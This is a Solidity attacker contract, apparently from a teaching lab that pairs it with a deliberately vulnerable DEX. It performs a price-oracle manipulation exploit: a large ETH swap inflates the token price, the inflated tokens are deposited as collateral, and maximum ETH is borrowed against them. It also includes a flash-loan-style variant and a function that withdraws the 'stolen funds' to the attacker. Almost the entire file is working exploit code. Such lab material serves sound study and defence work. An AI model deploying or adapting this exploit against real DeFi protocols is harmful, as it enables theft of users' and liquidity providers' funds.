// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./SC02_PriceOracle_Victim.sol";

contract PriceManipulationAttacker {
    VulnerableDEX public vulnerableDEX;
    address public attackerAddress;
    
    uint public initialPrice;
    uint public manipulatedPrice;
    uint public profit;
    
    constructor(address payable _vulnerableDEXAddress) {
        vulnerableDEX = VulnerableDEX(_vulnerableDEXAddress);
        attackerAddress = msg.sender;
        initialPrice = vulnerableDEX.getPrice();
    }
    
    // Attack: Manipulate price oracle to borrow more ETH than should be allowed
    function attack() public payable {
        require(msg.value > 0, "Need ETH to perform attack");
        
        // Step 1: Record initial state
        initialPrice = vulnerableDEX.getPrice();
        uint initialETHBalance = address(this).balance;
        
        console.log("=== ATTACK STARTED ===");
        console.log("Initial price:", initialPrice);
        console.log("Attacker ETH:", msg.value / 1 ether);
        
        // Step 2: Manipulate price by swapping large amount of ETH for tokens
        // This drastically increases token price (more ETH per token)
        vulnerableDEX.swapETHForTokens{value: msg.value}();
        
        manipulatedPrice = vulnerableDEX.getPrice();
        uint tokenBalance = vulnerableDEX.getTokenBalance(address(this));
        
        console.log("Manipulated price:", manipulatedPrice);
        console.log("Received tokens:", tokenBalance / 1 ether);
        console.log("Price increase %:", (manipulatedPrice * 100) / initialPrice);
        
        // Step 3: Deposit tokens as collateral
        vulnerableDEX.depositTokens(tokenBalance);
        
        // Step 4: Borrow maximum ETH using inflated price
        // At inflated price, tokens are worth much more, so we can borrow more
        (uint tokenReserve, uint ethReserve) = vulnerableDEX.getReserves();
        uint maxBorrow = ethReserve > 10 ether ? ethReserve - 10 ether : ethReserve / 2;
        
        console.log("Attempting to borrow:", maxBorrow / 1 ether, "ETH");
        
        try vulnerableDEX.borrowETH(maxBorrow) {
            console.log("Borrow successful!");
        } catch {
            // If max borrow fails, try 80% of it
            maxBorrow = (maxBorrow * 80) / 100;
            console.log("Retrying with:", maxBorrow / 1 ether, "ETH");
            vulnerableDEX.borrowETH(maxBorrow);
        }
        
        // Step 5: Calculate profit
        uint finalETHBalance = address(this).balance;
        if (finalETHBalance > initialETHBalance) {
            profit = finalETHBalance - initialETHBalance;
            console.log("PROFIT ETH:", profit / 1 ether);
        }
        
        console.log("=== ATTACK COMPLETED ===");
    }
    
    // Advanced attack: Flash loan style manipulation
    function flashAttack(uint flashAmount) public payable {
        require(msg.value >= flashAmount, "Need enough ETH for flash attack");
        
        initialPrice = vulnerableDEX.getPrice();
        
        console.log("=== FLASH ATTACK STARTED ===");
        console.log("Flash amount ETH:", flashAmount / 1 ether);
        console.log("Initial price:", initialPrice);
        
        // Step 1: Large swap to manipulate price
        vulnerableDEX.swapETHForTokens{value: flashAmount}();
        manipulatedPrice = vulnerableDEX.getPrice();
        
        uint tokenBalance = vulnerableDEX.getTokenBalance(address(this));
        console.log("Tokens received:", tokenBalance / 1 ether);
        console.log("Price after manipulation:", manipulatedPrice);
        
        // Step 2: Deposit minimal tokens
        uint depositAmount = tokenBalance / 10; // Only deposit 10%
        vulnerableDEX.depositTokens(depositAmount);
        
        // Step 3: Borrow at inflated price
        (uint tokenReserve, uint ethReserve) = vulnerableDEX.getReserves();
        uint borrowAmount = ethReserve / 3;
        
        try vulnerableDEX.borrowETH(borrowAmount) {
            console.log("Borrowed ETH at inflated price:", borrowAmount / 1 ether);
        } catch Error(string memory reason) {
            console.log("Borrow failed:", reason);
        }
        
        // Step 4: Swap remaining tokens back to ETH to restore price (partially)
        uint remainingTokens = tokenBalance - depositAmount;
        if (remainingTokens > 0) {
            vulnerableDEX.swapTokensForETH(remainingTokens);
            console.log("Swapped back tokens:", remainingTokens / 1 ether);
        }
        
        uint finalPrice = vulnerableDEX.getPrice();
        console.log("Final price:", finalPrice);
        
        profit = address(this).balance > msg.value ? address(this).balance - msg.value : 0;
        console.log("Net profit ETH:", profit / 1 ether);
        console.log("=== FLASH ATTACK COMPLETED ===");
    }
    
    // Withdraw all stolen ETH to attacker's address
    function withdrawStolenFunds() public {
        require(msg.sender == attackerAddress, "Only attacker can withdraw");
        uint amount = address(this).balance;
        (bool success, ) = payable(attackerAddress).call{value: amount}("");
        require(success, "Failed to send Ether");
    }
    
    function getProfit() public view returns (uint) {
        return profit;
    }
    
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
    
    receive() external payable {}
}
